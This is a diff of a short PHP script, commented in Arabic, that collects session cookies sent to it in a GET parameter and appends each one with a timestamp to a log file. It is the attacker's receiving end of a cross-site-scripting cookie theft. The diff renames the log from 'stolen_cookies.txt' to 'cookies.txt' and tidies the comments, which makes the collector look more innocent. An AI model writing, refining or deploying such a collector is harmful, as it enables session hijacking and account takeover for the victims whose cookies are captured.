@@ -1,20 +1,20 @@
 <?php
-// التحقق مما إذا كان الكوكي موجود في طلب GET
+// التحقق مما إذا كانت الكوكي موجودة في طلب GET
 if (isset($_GET['cookie'])) {
-    // تنقية الكوكيز للتأكد من عدم وجود أكواد خبيثة
+    // تنقية الكوكي للتأكد من عدم وجود أكواد خبيثة
     $cookie = filter_var($_GET['cookie'], FILTER_SANITIZE_STRING);
     
     // تحديد مسار الملف الذي سيتم حفظ الكوكيز فيه
-    $logFile = 'stolen_cookies.txt';
+    $logFile = 'cookies.txt';
     
-    // فتح الملف لكتابة الكوكيز
+    // فتح الملف في وضع الإلحاق (append mode) لكتابة الكوكيز دون استبدال الكوكيز السابقة
     $fp = fopen($logFile, 'a+');
     
     if ($fp) {
-        // كتابة الكوكيز مع إضافة الطابع الزمني
+        // كتابة الكوكي مع إضافة الطابع الزمني
         $logEntry = "Cookie: " . $cookie . " | Logged at: " . date("Y-m-d H:i:s") . "\n";
         fwrite($fp, $logEntry);
-        fclose($fp);
+        fclose($fp); // إغلاق الملف بعد الكتابة
         echo "Cookie saved successfully.";
     } else {
         echo "Failed to open log file.";
